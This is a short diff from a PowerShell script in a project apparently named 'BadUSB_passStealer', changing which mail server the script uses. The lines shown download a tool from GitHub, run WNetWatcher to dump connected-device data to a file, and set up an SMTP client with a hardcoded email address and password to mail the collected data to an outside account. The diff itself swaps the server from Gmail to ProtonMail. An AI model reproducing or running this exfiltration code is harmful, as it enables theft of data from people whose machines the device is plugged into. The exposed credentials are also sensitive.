@@ -11,7 +11,7 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 .\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices
 Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
 #Set mail option
-$SMTPServer = 'smtp.gmail.com'
+$SMTPServer = 'mail.protonmail.ch'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
 $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('silvurez@proton.me', ':.L"M56e"@sP^#v') #Email with which you want to send information
